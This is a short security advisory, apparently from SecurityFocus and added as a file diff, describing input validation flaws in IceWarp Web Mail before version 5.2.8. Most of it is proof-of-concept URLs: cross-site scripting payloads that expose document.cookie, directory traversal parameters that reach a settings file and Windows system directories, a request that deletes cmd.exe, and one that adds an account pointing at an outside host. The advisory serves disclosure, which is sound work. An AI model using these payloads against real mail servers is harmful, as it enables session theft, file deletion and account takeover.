@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/10920/info
+
+IceWarp Web Mail is reported prone to multiple input validation vulnerabilities. It is reported that these issues may be exploited by a remote attacker to conduct SQL Injection, Account Manipulation, Cross-site Scripting, Information disclosure, Local file system access, and other attacks. Few details regarding the specific vulnerabilities are known. 
+
+These vulnerabilities are reported to affect all versions of IceWarp Web Mail prior to version 5.2.8. The discoverer of these issues has reported that not all of these vulnerabilities were fixed in IceWarp Web Mail version 5.2.8.
+
+http:// www.example.com:32000/mail/accountsettings.html->Add->&#8221;Account name&#8221;,&#8221;Incoming mail server&#8221;,&#8221;User name&#8221; = <script>alert(document.cookie) </script>
+http:// www.example.com:32000/mail/search.html->&#8221;Search string&#8221; = <script> alert(document.cookie) </script>
+http://www.example.com:32000/mail/viewaction.html?Move_x=1&user=../../hacker
+http://www.example.com:32000/mail/viewaction.html?messageid=cmd.exe&action=delete&originalfolder=c:/winnt/system32
+http://www.example.com:32000/mail/viewaction.html?messageid=....//....//config/settings.cfg&Move_x=1&originalfolder=c:/Program%20Files/Merak/html/mail&user=../../html/mail
+http://www.example.com:32000/mail/attachment.html?user=merakdemo.com/admin&messageid=20040801&index=3&folder=inbox
+http://www.example.com:32000/mail/accountsettings_add.html?id=[sessionid]&Save_x=1&account[EMAIL]=hacker&account[HOST]=blackhat.org&account[HOSTUSER]=hacker&account[HOSTPASS]=31337&account[HOSTPASS2]=31337&accountid=[any text with special characters]
+http://www.example.com:32000/mail/folders.html?id=[sessionid]&folderold=....//....//....//&#8230;.//&#8230;.//winnt&folder=....//....//....//&#8230;.//&#8230;.//linux&Save_x=1
